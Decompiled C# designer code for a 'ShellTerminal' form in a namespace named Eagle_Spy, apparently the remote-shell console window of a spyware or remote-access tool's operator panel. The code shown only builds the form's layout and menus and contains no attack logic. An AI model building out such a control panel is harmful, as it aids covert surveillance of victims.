namespace Eagle_Spy
{
	// Token: 0x020000A6 RID: 166
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class ShellTerminal : global::System.Windows.Forms.Form
	{
		// Token: 0x060008BD RID: 2237 RVA: 0x000D8D60 File Offset: 0x000D6F60
		[global::System.Diagnostics.DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x060008BE RID: 2238 RVA: 0x000D8DA0 File Offset: 0x000D6FA0
		[global::System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			this.Caret = new global::System.Windows.Forms.Timer(this.components);
			this.TOpacity = new global::System.Windows.Forms.Timer(this.components);
			this.PB = new global::System.Windows.Forms.ProgressBar();
			this.ctxMenu = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.CopyToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.PasteToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.OutText = new global::Eagle_Spy.RTB();
			this.ctxMenu.SuspendLayout();
			base.SuspendLayout();
			this.OutText.TextChanged += new global::System.EventHandler(this.OutText_TextChanged);
			this.OutText.MouseClick += new global::System.Windows.Forms.MouseEventHandler(this.OutText_MouseClick);
			this.OutText.KeyDown += new global::System.Windows.Forms.KeyEventHandler(this.OutText_KeyDown);
			this.OutText.HScroll += new global::System.EventHandler(this.OutText_HScroll);
			this.OutText.VScroll += new global::System.EventHandler(this.OutText_VScroll);
			this.Caret.Tick += new global::System.EventHandler(this.Caret_Tick);
			this.TOpacity.Tick += new global::System.EventHandler(this.TOpacity_Tick);
			this.CopyToolStripMenuItem.Click += new global::System.EventHandler(this.CopyToolStripMenuItem_Click);
			this.PasteToolStripMenuItem.Click += new global::System.EventHandler(this.PasteToolStripMenuItem_Click);
			this.Caret.Interval = 500;
			this.TOpacity.Interval = 1;
			this.PB.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.PB.Location = new global::System.Drawing.Point(0, 231);
			this.PB.Name = "PB";
			this.PB.Size = new global::System.Drawing.Size(414, 10);
			this.PB.TabIndex = 6;
			this.ctxMenu.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.CopyToolStripMenuItem, this.PasteToolStripMenuItem });
			this.ctxMenu.Name = "ctxMenu";
			this.ctxMenu.ShowImageMargin = false;
			this.ctxMenu.Size = new global::System.Drawing.Size(78, 48);
			this.CopyToolStripMenuItem.Name = "CopyToolStripMenuItem";
			this.CopyToolStripMenuItem.Size = new global::System.Drawing.Size(77, 22);
			this.CopyToolStripMenuItem.Text = "Copy";
			this.PasteToolStripMenuItem.Name = "PasteToolStripMenuItem";
			this.PasteToolStripMenuItem.Size = new global::System.Drawing.Size(77, 22);
			this.PasteToolStripMenuItem.Text = "Paste";
			this.OutText.BackColor = global::System.Drawing.Color.Black;
			this.OutText.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.OutText.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.OutText.ForeColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
			this.OutText.Location = new global::System.Drawing.Point(0, 0);
			this.OutText.Name = "OutText";
			this.OutText.Size = new global::System.Drawing.Size(414, 231);
			this.OutText.TabIndex = 2;
			this.OutText.Text = "";
			this.OutText.WordWrap = false;
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new global::System.Drawing.Size(414, 241);
			base.Controls.Add(this.OutText);
			base.Controls.Add(this.PB);
			base.Name = "ShellTerminal";
			base.Opacity = 0.0;
			this.Text = "ShellTerminal";
			this.ctxMenu.ResumeLayout(false);
			base.ResumeLayout(false);
		}

		// Token: 0x04000A60 RID: 2656
		private global::System.ComponentModel.IContainer components;

		// Token: 0x04000A6B RID: 2667
		internal global::Eagle_Spy.RTB OutText;

		// Token: 0x04000A6C RID: 2668
		internal global::System.Windows.Forms.Timer Caret;

		// Token: 0x04000A6D RID: 2669
		internal global::System.Windows.Forms.Timer TOpacity;

		// Token: 0x04000A6E RID: 2670
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("PB")]
		internal global::System.Windows.Forms.ProgressBar PB;

		// Token: 0x04000A6F RID: 2671
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("ctxMenu")]
		internal global::System.Windows.Forms.ContextMenuStrip ctxMenu;

		// Token: 0x04000A70 RID: 2672
		internal global::System.Windows.Forms.ToolStripMenuItem CopyToolStripMenuItem;

		// Token: 0x04000A71 RID: 2673
		internal global::System.Windows.Forms.ToolStripMenuItem PasteToolStripMenuItem;
	}
}
